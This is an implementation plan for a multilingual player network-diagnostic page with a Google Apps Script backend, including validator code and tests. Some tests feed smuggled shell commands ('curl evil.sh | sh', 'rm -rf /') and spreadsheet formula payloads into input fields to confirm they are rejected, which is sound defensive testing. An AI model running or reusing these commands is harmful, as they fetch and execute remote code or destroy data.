# MHO Network Check Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 建立 MHO 玩家自助網路診斷頁面（9 語系、ASN／網段／延遲／UDP 量測、43 欄回報），與 DF 版完全分開。

**Architecture:** 靜態頁面 `index.html`＋`i18n.js` 放在 GitHub Pages；後端是 Google Apps Script Web App（`apps-script.js`），寫入新的 Google 試算表。純函式寫在各自的檔案內，測試用 node 的 `vm` 載入檔案後直接呼叫，不需要任何套件。

**Tech Stack:** 原生 HTML／CSS／JS（無框架、無建置）、Google Apps Script、node 22（只用來跑測試）、headless Chrome（瀏覽器實測）

**規格：** `docs/specs/2026-11-17-mho-network-check-design.md`

**參考實作：** DF 版 `../network-check/index.html`、`../network-check/apps-script.js`

---

## 檔案結構

| 檔案 | 責任 |
|---|---|
| `apps-script.js` | 後端：`doGet` 回傳 `IP_Region`；`doPost` 驗證、組列、寫入。純函式：驗證、`validatePayload`、`buildRow`、`buildIspSummary`、`buildCommands` |
| `index.html` | 版面、CSS、前端邏輯。純函式：`latencyStats`、`classifyNat`、`resolveServers`、`parseCfTrace`、`extractIspInfo`、`ptrName`、`issueTimeUtc`、`buildIssueTime` |
| `i18n.js` | `const I18N = { en, zh, vi, th, id, es, ko, pt, ar }` |
| `img/roleid.jpg` | Role ID 說明圖（由 `roleid.png` 壓縮） |
| `tests/run.js` | 測試執行器與載入工具 |
| `tests/backend.test.js` | 後端純函式測試 |
| `tests/frontend.test.js` | 前端純函式測試 |
| `tests/i18n.test.js` | 語系完整性測試 |
| `tests/browser-smoke.js` | 以 headless Chrome 開本機頁面，讀回 `state` |
| `docs/security.md` | 威脅模型 |
| `docs/deploy.md` | 給 Steve 的後端部署步驟 |

測試指令一律為：`node tests/run.js`

---

### Task 1: 測試執行器

**Files:**
- Create: `tests/run.js`

- [ ] **Step 1: 建立執行器**

```js
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const assert = require('assert');

const root = path.join(__dirname, '..');
const read = f => fs.readFileSync(path.join(root, f), 'utf8');
const tests = [];

global.test = (name, fn) => tests.push({ name, fn });
global.assert = assert;

// Top-level const/let are not context properties, so the loader returns them explicitly
global.loadBackend = (stubs = {}) => {
  const ctx = vm.createContext({ console, ...stubs });
  const exported = vm.runInContext(read('apps-script.js') +
    '\n;({ REPORT_HEADERS, LATENCY_TARGETS, ENUMS, REGIONS })', ctx);
  return Object.assign(ctx, exported);
};

global.loadFrontend = (stubs = {}) => {
  const html = read('index.html');
  const inline = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => m[1]).join('\n');
  const ctx = vm.createContext({ console, window: { __TEST__: true }, Intl, Date, Math, ...stubs });
  const exported = vm.runInContext(read('i18n.js') + '\n' + inline +
    '\n;({ I18N, LATENCY_TARGETS, state })', ctx);
  return Object.assign(ctx, exported);
};

global.loadI18n = () => vm.runInContext(read('i18n.js') + '\n;I18N', vm.createContext({}));

for (const f of fs.readdirSync(__dirname).filter(f => f.endsWith('.test.js')).sort()) {
  require(path.join(__dirname, f));
}

let failed = 0;
(async () => {
  for (const t of tests) {
    try { await t.fn(); console.log('ok   ' + t.name); }
    catch (e) { failed++; console.log('FAIL ' + t.name + '\n     ' + e.message); }
  }
  console.log(`\n${tests.length - failed}/${tests.length} passed`);
  process.exit(failed ? 1 : 0);
})();
```

- [ ] **Step 2: 執行，確認沒有測試時正常結束**

Run: `node tests/run.js`
Expected: `0/0 passed`

- [ ] **Step 3: Commit**

```bash
git add tests/run.js && git commit -m "test: add dependency-free test runner"
```

---

### Task 2: 後端驗證函式

**Files:**
- Create: `apps-script.js`
- Create: `tests/backend.test.js`

- [ ] **Step 1: 寫失敗的測試**

```js
test('cellSafe neutralises formulas and strips control chars', () => {
  const b = loadBackend();
  assert.strictEqual(b.cellSafe('=IMPORTXML("x")'), "'=IMPORTXML(\"x\")");
  assert.strictEqual(b.cellSafe('+1'), "'+1");
  assert.strictEqual(b.cellSafe('a\u0000b'), 'ab');
  assert.strictEqual(b.cellSafe(''), '—');
  assert.strictEqual(b.cellSafe('x'.repeat(300)).length, 200);
});

test('isValidIp accepts v4/v6 and rejects injection', () => {
  const b = loadBackend();
  assert.ok(b.isValidIp('1.2.3.4'));
  assert.ok(b.isValidIp('2001:db8::1'));
  assert.ok(!b.isValidIp('1.2.3.4; curl evil.sh | sh'));
  assert.ok(!b.isValidIp('256.1.1.1'));
});

test('pickEnum / pickEnumList only allow whitelisted values', () => {
  const b = loadBackend();
  assert.strictEqual(b.pickEnum('wifi', b.ENUMS.networkType), 'wifi');
  assert.strictEqual(b.pickEnum('=1', b.ENUMS.networkType), '—');
  assert.strictEqual(b.pickEnumList(['disconnect', 'x', 'disconnect', 'lag_spike'], b.ENUMS.issueType), 'disconnect, lag_spike');
  assert.strictEqual(b.pickEnumList('disconnect', b.ENUMS.issueType), '—');
});

test('intInRange accepts plain integers only', () => {
  const b = loadBackend();
  assert.strictEqual(b.intInRange(120, 0, 10000), 120);
  assert.strictEqual(b.intInRange('85', 0, 10000), 85);
  assert.strictEqual(b.intInRange('', 0, 10000), '—');
  assert.strictEqual(b.intInRange('1e3', 0, 10000), '—');
  assert.strictEqual(b.intInRange(-1, 0, 10000), '—');
  assert.strictEqual(b.intInRange(101, 0, 100), '—');
});

test('validAsn / validCidr / validColo / validUtcStamp', () => {
  const b = loadBackend();
  assert.strictEqual(b.validAsn('as4766'), 'AS4766');
  assert.strictEqual(b.validAsn('AS4766 KT'), '—');
  assert.strictEqual(b.validCidr('41.92.0.0/17'), '41.92.0.0/17');
  assert.strictEqual(b.validCidr('2001:db8::/32'), '2001:db8::/32');
  assert.strictEqual(b.validCidr('41.92.0.0/33'), '—');
  assert.strictEqual(b.validCidr('=1/2'), '—');
  assert.strictEqual(b.validColo('icn'), 'ICN');
  assert.strictEqual(b.validColo('ICN1'), '—');
  assert.strictEqual(b.validUtcStamp('2026-11-17T13:05Z'), '2026-11-17T13:05Z');
  assert.strictEqual(b.validUtcStamp('2026-11-17 13:05'), '');
});

test('egressText dedupes, validates and caps at 5', () => {
  const b = loadBackend();
  assert.strictEqual(b.egressText(['1.1.1.1', '1.1.1.1']), 'single');
  assert.strictEqual(b.egressText(['1.1.1.1', '2.2.2.2', 'bad']), '1.1.1.1, 2.2.2.2');
  assert.strictEqual(b.egressText([]), '—');
  assert.strictEqual(b.egressText('1.1.1.1'), '—');
});
```

- [ ] **Step 2: 執行，確認失敗**

Run: `node tests/run.js`
Expected: FAIL（`apps-script.js` 不存在）

- [ ] **Step 3: 實作 `apps-script.js` 的設定與驗證區塊**

```js
// ── Configuration ─────────────────────────────────────────────────────────
const SHEET_ID        = 'FILL_ME';   // MHO sheet — never the DF one
const DRIVE_FOLDER_ID = 'FILL_ME';
const REPORT_TIMEZONE = 'Asia/Taipei';

// ── Input limits ──────────────────────────────────────────────────────────
// The Web App is deployed to "Anyone", so anything can POST here directly.
// The frontend mirrors these rules for UX; THIS is the actual boundary.
const MAX_PAYLOAD_CHARS    = 14 * 1024 * 1024;
const MAX_FIELD_CHARS      = 200;
const MAX_TRACE_CHARS      = 20000;
const MAX_SCREENSHOTS      = 4;
const MAX_SCREENSHOT_BYTES = 5 * 1024 * 1024;
const RATE_LIMIT_SECONDS   = 30;

const REGIONS         = ['APAC', 'KR', 'LATAM', 'MEA'];
const LATENCY_TARGETS = ['SG', 'FRA', 'SAO', 'QRO', 'SEL'];
const ENUMS = {
  networkType:  ['wired', 'wifi', 'mobile'],
  vpn:          ['yes', 'no', 'unsure'],
  issuePattern: ['constant', 'specific_hours', 'occasional'],
  issueType:    ['high_latency', 'lag_spike', 'disconnect', 'login_fail', 'slow_download'],
  udpNat:       ['cone', 'symmetric', 'blocked'],
  warp:         ['on', 'off'],
  platform:     ['PC', 'iOS', 'Android'],
};
const UDP_LABELS = {
  cone:      'UDP ok · NAT: cone',
  symmetric: 'UDP ok · NAT: symmetric',
  blocked:   'UDP blocked',
};

// ── Input hardening ───────────────────────────────────────────────────────
// Sheets evaluates a cell starting with = + - @ as a formula
function cellSafe(value, maxLen) {
  const s = String(value === null || value === undefined ? '' : value)
    .replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g, '')
    .slice(0, maxLen || MAX_FIELD_CHARS)
    .trim();
  if (!s) return '—';
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

function oneLine(value) {
  return String(value === null || value === undefined ? '' : value).replace(/[\r\n\t]+/g, ' ');
}

// The command column is pasted into a shell by an operator
function isValidIp(value) {
  const s = String(value || '').trim();
  const v4 = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(s);
  if (v4) return v4.slice(1).every(n => Number(n) <= 255);
  return s.indexOf(':') !== -1 && /^[0-9A-Fa-f:.]{2,45}$/.test(s);
}

function pickEnum(value, allowed) {
  const s = String(value === null || value === undefined ? '' : value).trim();
  return allowed.indexOf(s) !== -1 ? s : '—';
}

function pickEnumList(values, allowed) {
  if (!Array.isArray(values)) return '—';
  const out = [];
  values.forEach(v => {
    const s = String(v).trim();
    if (allowed.indexOf(s) !== -1 && out.indexOf(s) === -1) out.push(s);
  });
  return out.length ? out.join(', ') : '—';
}

function intInRange(value, min, max) {
  const s = String(value === null || value === undefined ? '' : value).trim();
  if (!/^\d{1,6}$/.test(s)) return '—';
  const n = Number(s);
  return n >= min && n <= max ? n : '—';
}

function validAsn(value) {
  const s = String(value || '').trim().toUpperCase();
  return /^AS\d{1,10}$/.test(s) ? s : '—';
}

function validCidr(value) {
  const s = String(value || '').trim();
  const m = /^([0-9A-Fa-f:.]+)\/(\d{1,3})$/.exec(s);
  if (!m || !isValidIp(m[1])) return '—';
  const max = m[1].indexOf(':') !== -1 ? 128 : 32;
  return Number(m[2]) <= max ? s : '—';
}

function validColo(value) {
  const s = String(value || '').trim().toUpperCase();
  return /^[A-Z]{3}$/.test(s) ? s : '—';
}

function validUtcStamp(value) {
  const s = String(value || '').trim();
  return /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}Z$/.test(s) ? s : '';
}

function egressText(values) {
  if (!Array.isArray(values)) return '—';
  const ips = [];
  values.slice(0, 5).forEach(v => {
    const s = String(v).trim();
    if (isValidIp(s) && ips.indexOf(s) === -1) ips.push(s);
  });
  if (!ips.length) return '—';
  return ips.length === 1 ? 'single' : ips.join(', ');
}
```

- [ ] **Step 4: 執行，確認通過**

Run: `node tests/run.js`
Expected: `6/6 passed`

- [ ] **Step 5: Commit**

```bash
git add apps-script.js tests/backend.test.js && git commit -m "feat(backend): field validators"
```

---

### Task 3: 後端組列、ISP 摘要、指令

**Files:**
- Modify: `apps-script.js`（接在驗證區塊後）
- Modify: `tests/backend.test.js`

- [ ] **Step 1: 寫失敗的測試**

```js
const samplePayload = () => ({
  ip: '41.92.118.61', issueTime: '2026-11-17 21:05 (Africa/Casablanca) → 台北 2026-11-18 04:05',
  issueTimeUtc: '2026-11-17T20:05Z', issuePattern: 'specific_hours', issueType: ['high_latency'],
  inGamePing: '180', roleId: '123456', nickname: 'hunter',
  asn: 'AS36925', isp: 'MEDITELECOM', prefix: '41.92.0.0/17', countryCode: 'MA', city: 'Casablanca',
  rdns: '', egressIps: ['41.92.118.61'], cfColo: 'CMN', warp: 'off',
  networkType: 'wifi', vpn: 'no', connectionType: '4G',
  latency: { SG: { median: 210, jitter: 4, loss: 0 }, FRA: { median: 60, jitter: 3, loss: 10 },
             SAO: { median: 'x' }, QRO: {}, SEL: { median: 260, jitter: 5, loss: 0 } },
  udpNat: 'cone', os: 'Android', browser: 'Chrome', screen: '412x915', timezone: 'Africa/Casablanca',
  deviceMemory: '8 GB', cpuCores: '8', platform: 'Android', language: 'ar',
  servers: [{ label: 'Frankfurt', ip: '43.158.100.39', traceroute: '', pathping: '' }],
});

test('REPORT_HEADERS has the 43 spec columns in order', () => {
  const b = loadBackend();
  assert.strictEqual(b.REPORT_HEADERS.length, 43);
  assert.strictEqual(b.REPORT_HEADERS[0], 'Submission Time');
  assert.strictEqual(b.REPORT_HEADERS[20], 'SG (ms)');
  assert.strictEqual(b.REPORT_HEADERS[39], 'ISP Summary');
  assert.strictEqual(b.REPORT_HEADERS[42], 'Status');
});

test('buildRow lines up with REPORT_HEADERS', () => {
  const b = loadBackend();
  const row = b.buildRow(b.validatePayload(samplePayload()),
    { submissionTime: 'T', sheetName: 'MEA', screenshotUrl: '—' });
  assert.strictEqual(row.length, b.REPORT_HEADERS.length);
  const at = h => row[b.REPORT_HEADERS.indexOf(h)];
  assert.strictEqual(at('ASN'), 'AS36925');
  assert.strictEqual(at('Egress IPs'), 'single');
  assert.strictEqual(at('FRA (ms)'), 60);
  assert.strictEqual(at('SAO (ms)'), '—');
  assert.strictEqual(at('Latency Detail'), 'SG j4 0% · FRA j3 10% · SEL j5 0%');
  assert.strictEqual(at('UDP / NAT'), 'UDP ok · NAT: cone');
  assert.strictEqual(at('Region'), 'MEA');
  assert.strictEqual(at('Ping / MTR Command'), 'ping -c 20 41.92.118.61\nmtr -rwzc 50 41.92.118.61');
  assert.strictEqual(at('Status'), 'Pending');
});

test('buildIspSummary uses only validated values', () => {
  const b = loadBackend();
  const s = b.buildIspSummary(b.validatePayload(samplePayload()));
  assert.strictEqual(s, [
    'Source IP: 41.92.118.61',
    'Prefix: 41.92.0.0/17 (AS36925 MEDITELECOM)',
    'Destinations: Frankfurt 43.158.100.39',
    'Issue time (UTC): 2026-11-17 20:05',
    'Pattern: specific_hours',
    'Browser RTT median: SG 210 ms, FRA 60 ms, SEL 260 ms',
    'UDP: UDP ok · NAT: cone',
  ].join('\n'));
});

test('injected values never reach commands or summary', () => {
  const b = loadBackend();
  const p = samplePayload();
  p.ip = '1.2.3.4; curl evil.sh | sh';
  p.isp = 'X\nSource IP: 6.6.6.6';
  p.servers = [{ label: '=HYPERLINK("x")', ip: '1.1.1.1;rm -rf /', traceroute: '=IMPORTXML("a")' }];
  const v = b.validatePayload(p);
  const row = b.buildRow(v, { submissionTime: 'T', sheetName: 'Other', screenshotUrl: '—' });
  const at = h => row[b.REPORT_HEADERS.indexOf(h)];
  assert.strictEqual(at('Ping / MTR Command'), 'no valid IP — do not run');
  assert.strictEqual(at('ISP Summary'), '—');
  assert.ok(String(at('Traceroute')).startsWith('['));
  assert.ok(!String(at('Traceroute')).includes('rm -rf'));
  v.ip = '9.9.9.9';
  assert.ok(!b.buildIspSummary(v).includes('\nSource IP: 6.6.6.6'));
});

test('issue time falls back to player text without a UTC stamp', () => {
  const b = loadBackend();
  const p = samplePayload();
  p.issueTimeUtc = 'bad';
  assert.ok(b.buildIspSummary(b.validatePayload(p)).includes('Issue time (player local): 2026-11-17 21:05'));
});
```

- [ ] **Step 2: 執行，確認失敗**

Run: `node tests/run.js`
Expected: 新的 5 項 FAIL（`buildRow is not a function` 等）

- [ ] **Step 3: 實作**

```js
const REPORT_HEADERS = [
  'Submission Time', 'Issue Time', 'Issue Pattern', 'Issue Type', 'In-game Ping (ms)',
  'Role ID', 'Nickname',
  'IP', 'ASN', 'ISP / AS Name', 'BGP Prefix', 'Country Code', 'City', 'Reverse DNS',
  'Egress IPs', 'CF Colo', 'WARP',
  'Network Type', 'VPN / Accelerator', 'Mobile Connection',
  'SG (ms)', 'FRA (ms)', 'SAO (ms)', 'QRO (ms)', 'SEL ref (ms)', 'Latency Detail', 'UDP / NAT',
  'OS', 'Browser', 'Screen', 'Timezone', 'Memory (GB)', 'CPU Cores',
  'Platform', 'Region', 'Traceroute', 'Pathping', 'Screenshot URL', 'Language',
  'ISP Summary', 'Ping / MTR Command', 'Reverse Ping Result', 'Status',
];

function readLatency(raw) {
  const src = raw && typeof raw === 'object' && !Array.isArray(raw) ? raw : {};
  const out = {};
  LATENCY_TARGETS.forEach(k => {
    const r = src[k] && typeof src[k] === 'object' ? src[k] : {};
    out[k] = {
      median: intInRange(r.median, 0, 10000),
      jitter: intInRange(r.jitter, 0, 10000),
      loss:   intInRange(r.loss, 0, 100),
    };
  });
  return out;
}

function readServers(raw) {
  return (Array.isArray(raw) ? raw : []).slice(0, 10)
    .filter(s => s && typeof s === 'object')
    .map(s => ({
      label:      oneLine(s.label).slice(0, 60),
      ip:         isValidIp(s.ip) ? String(s.ip).trim() : '',
      traceroute: String(s.traceroute || ''),
      pathping:   String(s.pathping || ''),
    }));
}

function validatePayload(p) {
  return {
    ip:               isValidIp(p.ip) ? String(p.ip).trim() : '',
    ipRaw:            cellSafe(oneLine(p.ip), 60),
    issueTime:        cellSafe(oneLine(p.issueTime), 120),
    issueTimeUtc:     validUtcStamp(p.issueTimeUtc),
    pattern:          pickEnum(p.issuePattern, ENUMS.issuePattern),
    issueType:        pickEnumList(p.issueType, ENUMS.issueType),
    inGamePing:       intInRange(p.inGamePing, 0, 10000),
    roleId:           cellSafe(oneLine(p.roleId), 100),
    nickname:         cellSafe(oneLine(p.nickname), 60),
    asn:              validAsn(p.asn),
    asName:           cellSafe(oneLine(p.isp), 120),
    prefix:           validCidr(p.prefix),
    countryCode:      cellSafe(oneLine(p.countryCode), 8),
    city:             cellSafe(oneLine(p.city), 60),
    rdns:             cellSafe(oneLine(p.rdns), 255),
    egress:           egressText(p.egressIps),
    colo:             validColo(p.cfColo),
    warp:             pickEnum(p.warp, ENUMS.warp),
    networkType:      pickEnum(p.networkType, ENUMS.networkType),
    vpn:              pickEnum(p.vpn, ENUMS.vpn),
    mobileConnection: cellSafe(oneLine(p.connectionType), 40),
    latency:          readLatency(p.latency),
    udpNat:           ENUMS.udpNat.indexOf(String(p.udpNat)) !== -1 ? UDP_LABELS[p.udpNat] : '—',
    os:               cellSafe(oneLine(p.os), 40),
    browser:          cellSafe(oneLine(p.browser), 40),
    screen:           cellSafe(oneLine(p.screen), 30),
    timezone:         cellSafe(oneLine(p.timezone), 60),
    deviceMemory:     cellSafe(oneLine(p.deviceMemory), 20),
    cpuCores:         cellSafe(oneLine(p.cpuCores), 20),
    platform:         pickEnum(p.platform, ENUMS.platform),
    language:         cellSafe(oneLine(p.language), 8),
    servers:          readServers(p.servers),
  };
}

function latencyDetail(lat) {
  const parts = LATENCY_TARGETS.filter(k => lat[k].median !== '—')
    .map(k => `${k} j${lat[k].jitter} ${lat[k].loss}%`);
  return parts.length ? parts.join(' · ') : '—';
}

function serverBlocks(servers, field) {
  return cellSafe(servers.filter(s => s[field])
    .map(s => `[${s.label} — ${s.ip || 'invalid'}]\n${s[field]}`)
    .join('\n\n'), MAX_TRACE_CHARS);
}

function buildIspSummary(v) {
  if (!v.ip) return '—';
  const lines = [`Source IP: ${v.ip}`];
  const owner = v.asn !== '—' ? v.asn + (v.asName !== '—' ? ' ' + v.asName : '') : '';
  if (v.prefix !== '—') lines.push(`Prefix: ${v.prefix}` + (owner ? ` (${owner})` : ''));
  else if (owner) lines.push(`ASN: ${owner}`);
  const dest = v.servers.filter(s => s.ip).map(s => `${s.label} ${s.ip}`);
  if (dest.length) lines.push('Destinations: ' + dest.join(', '));
  lines.push(v.issueTimeUtc
    ? `Issue time (UTC): ${v.issueTimeUtc.replace('T', ' ').replace('Z', '')}`
    : `Issue time (player local): ${v.issueTime}`);
  if (v.pattern !== '—') lines.push(`Pattern: ${v.pattern}`);
  const rtt = LATENCY_TARGETS.filter(k => v.latency[k].median !== '—')
    .map(k => `${k} ${v.latency[k].median} ms`);
  if (rtt.length) lines.push('Browser RTT median: ' + rtt.join(', '));
  if (v.udpNat !== '—') lines.push('UDP: ' + v.udpNat);
  return cellSafe(lines.join('\n'), 2000);
}

function buildCommands(ip) {
  return ip ? `ping -c 20 ${ip}\nmtr -rwzc 50 ${ip}` : 'no valid IP — do not run';
}

function buildRow(v, ctx) {
  const lat = v.latency;
  return [
    ctx.submissionTime, v.issueTime, v.pattern, v.issueType, v.inGamePing,
    v.roleId, v.nickname,
    v.ip || v.ipRaw, v.asn, v.asName, v.prefix, v.countryCode, v.city, v.rdns,
    v.egress, v.colo, v.warp,
    v.networkType, v.vpn, v.mobileConnection,
    lat.SG.median, lat.FRA.median, lat.SAO.median, lat.QRO.median, lat.SEL.median,
    latencyDetail(lat), v.udpNat,
    v.os, v.browser, v.screen, v.timezone, v.deviceMemory, v.cpuCores,
    v.platform, ctx.sheetName,
    serverBlocks(v.servers, 'traceroute'), serverBlocks(v.servers, 'pathping'),
    ctx.screenshotUrl, v.language,
    buildIspSummary(v), buildCommands(v.ip), '', 'Pending',
  ];
}
```

- [ ] **Step 4: 執行，確認通過**

Run: `node tests/run.js`
Expected: `11/11 passed`

- [ ] **Step 5: Commit**

```bash
git add apps-script.js tests/backend.test.js && git commit -m "feat(backend): row builder, ISP summary and commands"
```

---

### Task 4: 後端 doGet／doPost

**Files:**
- Modify: `apps-script.js`
- Modify: `tests/backend.test.js`

- [ ] **Step 1: 寫失敗的測試**（以假的 SpreadsheetApp 擷取 `appendRow`）

```js
function fakeGoogle(ipRegionRows) {
  const sheets = {}, cache = {};
  const makeSheet = name => (sheets[name] = sheets[name] || {
    rows: [], appendRow(r) { this.rows.push(r); },
    getRange() { return { setValues() { return this; }, setFontWeight() { return this; } }; },
    setFrozenRows() {},
    getDataRange: () => ({ getValues: () => ipRegionRows }),
  });
  if (ipRegionRows) makeSheet('IP_Region');
  return {
    sheets,
    stubs: {
      SpreadsheetApp: { openById: () => ({ getSheetByName: n => sheets[n] || null, insertSheet: makeSheet }) },
      CacheService: { getScriptCache: () => ({ get: k => cache[k] || null, put: (k, v) => { cache[k] = v; } }) },
      Utilities: { formatDate: () => '2026-11-17 21:00:00 UTC+0800', base64Decode: () => [] },
      ContentService: { MimeType: { JSON: 'json' }, createTextOutput: s => ({ setMimeType: () => JSON.parse(s) }) },
      DriveApp: {},
    },
  };
}
const IP_REGION = [
  ['Region', 'Server Name', 'IP', 'Country Codes'],
  ['LATAM', 'Queretaro', '161.120.133.175', 'MX'],
  ['APAC', 'Singapore', '43.172.182.161', '*'],
  ['', '', '', ''],
];

test('doGet returns rows including the * row', () => {
  const g = fakeGoogle(IP_REGION);
  const out = loadBackend(g.stubs).doGet();
  assert.deepStrictEqual(JSON.parse(JSON.stringify(out)), [
    { region: 'LATAM', name: 'Queretaro', ip: '161.120.133.175', countries: ['MX'] },
    { region: 'APAC', name: 'Singapore', ip: '43.172.182.161', countries: ['*'] },
  ]);
});

test('doPost routes to known region, unknown to Other, rate-limits', () => {
  const g = fakeGoogle(IP_REGION);
  const b = loadBackend(g.stubs);
  const post = p => b.doPost({ postData: { contents: JSON.stringify(p) } });
  assert.strictEqual(post({ ip: '1.1.1.1', region: 'LATAM' }).status, 'ok');
  assert.strictEqual(post({ ip: '1.1.1.1', region: 'LATAM' }).status, 'error');
  assert.strictEqual(post({ ip: '2.2.2.2', region: 'HACKED' }).status, 'ok');
  assert.strictEqual(g.sheets.LATAM.rows.length, 1);
  assert.strictEqual(g.sheets.Other.rows.length, 1);
  assert.ok(!g.sheets.HACKED);
  assert.strictEqual(g.sheets.LATAM.rows[0].length, 43);
});

test('doPost rejects malformed bodies', () => {
  const b = loadBackend(fakeGoogle(IP_REGION).stubs);
  assert.strictEqual(b.doPost({}).status, 'error');
  assert.strictEqual(b.doPost({ postData: { contents: '[1]' } }).status, 'error');
  assert.strictEqual(b.doPost({ postData: { contents: '{bad' } }).status, 'error');
});
```

- [ ] **Step 2: 執行，確認失敗**

Run: `node tests/run.js`
Expected: 新的 3 項 FAIL

- [ ] **Step 3: 實作**（`imageKind`、`rateLimited` 從 DF 原樣搬過來）

```js
// ── Serve IP_Region config as JSON (GET) ──────────────────────────────────
function doGet() {
  try {
    const sheet = SpreadsheetApp.openById(SHEET_ID).getSheetByName('IP_Region');
    if (!sheet) return jsonOut([]);
    const config = sheet.getDataRange().getValues().slice(1)
      .filter(r => r[0] && r[2])
      .map(r => ({
        region:    String(r[0]).trim(),
        name:      String(r[1]).trim(),
        ip:        String(r[2]).trim(),
        countries: String(r[3]).split(',').map(c => c.trim().toUpperCase()).filter(Boolean),
      }));
    return jsonOut(config);
  } catch (err) {
    return jsonOut({ error: err.toString() });
  }
}

// Trust the file's own magic bytes, never the client-supplied mimeType
function imageKind(b) {
  if (b.length > 3  && b[0] === -1 && b[1] === -40 && b[2] === -1) return 'jpg';
  if (b.length > 8  && b[0] === -119 && b[1] === 80 && b[2] === 78 && b[3] === 71) return 'png';
  if (b.length > 12 && b[0] === 82 && b[1] === 73 && b[2] === 70 && b[3] === 70
                    && b[8] === 87 && b[9] === 69 && b[10] === 66 && b[11] === 80) return 'webp';
  if (b.length > 12 && b[4] === 102 && b[5] === 116 && b[6] === 121 && b[7] === 112) return 'heic';
  return null;
}

function rateLimited(key) {
  const cache = CacheService.getScriptCache();
  if (cache.get('rl_' + key)) return true;
  cache.put('rl_' + key, '1', RATE_LIMIT_SECONDS);
  return false;
}

// Only the four game regions, and only those present in IP_Region, may become sheets
function allowedRegions(ss) {
  const sheet = ss.getSheetByName('IP_Region');
  if (!sheet) return [];
  return sheet.getDataRange().getValues().slice(1)
    .map(r => String(r[0]).trim()).filter(r => REGIONS.indexOf(r) !== -1);
}

function saveScreenshots(raw, submissionTime, ip) {
  const urls = [];
  (Array.isArray(raw) ? raw.slice(0, MAX_SCREENSHOTS) : []).forEach((s, i) => {
    if (!s || typeof s.data !== 'string') return;
    let bytes;
    try { bytes = Utilities.base64Decode(s.data); } catch (err) { return; }
    if (bytes.length > MAX_SCREENSHOT_BYTES) return;
    const kind = imageKind(bytes);
    if (!kind) return;
    const name = `${submissionTime}_${ip || 'unknown'}_${i + 1}.${kind}`.replace(/[:+ ]/g, '-');
    const mime = kind === 'jpg' ? 'image/jpeg' : 'image/' + kind;
    const file = DriveApp.getFolderById(DRIVE_FOLDER_ID).createFile(Utilities.newBlob(bytes, mime, name));
    file.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
    urls.push(file.getUrl());
  });
  return urls.length ? urls.join('\n') : '—';
}

// ── Save report (POST) ────────────────────────────────────────────────────
function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) return jsonOut({ status: 'error', message: 'empty request' });
    if (e.postData.contents.length > MAX_PAYLOAD_CHARS) return jsonOut({ status: 'error', message: 'payload too large' });

    let payload;
    try { payload = JSON.parse(e.postData.contents); }
    catch (err) { return jsonOut({ status: 'error', message: 'malformed json' }); }
    if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
      return jsonOut({ status: 'error', message: 'malformed payload' });
    }

    const v = validatePayload(payload);
    if (rateLimited(v.ip || 'anonymous')) return jsonOut({ status: 'error', message: 'too many submissions' });

    const submissionTime = Utilities.formatDate(new Date(), REPORT_TIMEZONE, "yyyy-MM-dd HH:mm:ss 'UTC'Z");
    const ss        = SpreadsheetApp.openById(SHEET_ID);
    const requested = String(payload.region || '').trim();
    const sheetName = allowedRegions(ss).indexOf(requested) !== -1 ? requested : 'Other';

    getOrCreateSheet(ss, sheetName).appendRow(buildRow(v, {
      submissionTime,
      sheetName,
      screenshotUrl: saveScreenshots(payload.screenshots, submissionTime, v.ip),
    }));
    return jsonOut({ status: 'ok' });
  } catch (err) {
    return jsonOut({ status: 'error', message: err.toString() });
  }
}

// ── Helpers ───────────────────────────────────────────────────────────────
function getOrCreateSheet(ss, name) {
  let sheet = ss.getSheetByName(name);
  if (!sheet) {
    sheet = ss.insertSheet(name);
    sheet.getRange(1, 1, 1, REPORT_HEADERS.length).setValues([REPORT_HEADERS]);
    sheet.setFrozenRows(1);
    sheet.getRange(1, 1, 1, REPORT_HEADERS.length).setFontWeight('bold');
  }
  return sheet;
}

// Run once after creating the sheet
function setup() {
  const ss = SpreadsheetApp.openById(SHEET_ID);
  if (!ss.getSheetByName('IP_Region')) {
    const cfg = ss.insertSheet('IP_Region');
    cfg.getRange(1, 1, 1, 4).setValues([['Region', 'Server Name', 'IP', 'Country Codes (comma-separated, * = everyone else)']]);
    cfg.setFrozenRows(1);
    cfg.getRange(1, 1, 1, 4).setFontWeight('bold');
  }
  REGIONS.concat('Other').forEach(n => getOrCreateSheet(ss, n));
}

function jsonOut(data) {
  return ContentService.createTextOutput(JSON.stringify(data)).setMimeType(ContentService.MimeType.JSON);
}
```

- [ ] **Step 4: 執行，確認通過**

Run: `node tests/run.js`
Expected: `14/14 passed`

- [ ] **Step 5: Commit**

```bash
git add apps-script.js tests/backend.test.js && git commit -m "feat(backend): doGet/doPost with region routing and rate limit"
```

---

### Task 5: 前端純函式

**Files:**
- Create: `index.html`（先只有 `<script>` 區塊與最小的 HTML 骨架）
- Create: `i18n.js`（先放 `const I18N = { en: {} };`）
- Create: `tests/frontend.test.js`

- [ ] **Step 1: 寫失敗的測試**

```js
test('latencyStats: median, jitter, loss', () => {
  const f = loadFrontend();
  assert.deepStrictEqual(JSON.parse(JSON.stringify(f.latencyStats([100, 110, null, 90, 100]))),
    { median: 100, jitter: 13, loss: 20 });
  assert.deepStrictEqual(JSON.parse(JSON.stringify(f.latencyStats([null, null]))),
    { median: null, jitter: null, loss: 100 });
  assert.strictEqual(f.latencyStats([50]).jitter, null);
});

test('classifyNat', () => {
  const f = loadFrontend();
  assert.strictEqual(f.classifyNat([]), 'blocked');
  assert.strictEqual(f.classifyNat([{ ip: '2001:db8::1', port: 1, relPort: 0 }]), 'blocked');
  assert.strictEqual(f.classifyNat([{ ip: '1.2.3.4', port: 5000, relPort: 6000 }]), 'cone');
  assert.strictEqual(f.classifyNat([
    { ip: '1.2.3.4', port: 5000, relPort: 6000 }, { ip: '1.2.3.4', port: 5001, relPort: 6000 },
  ]), 'symmetric');
  assert.strictEqual(f.classifyNat([
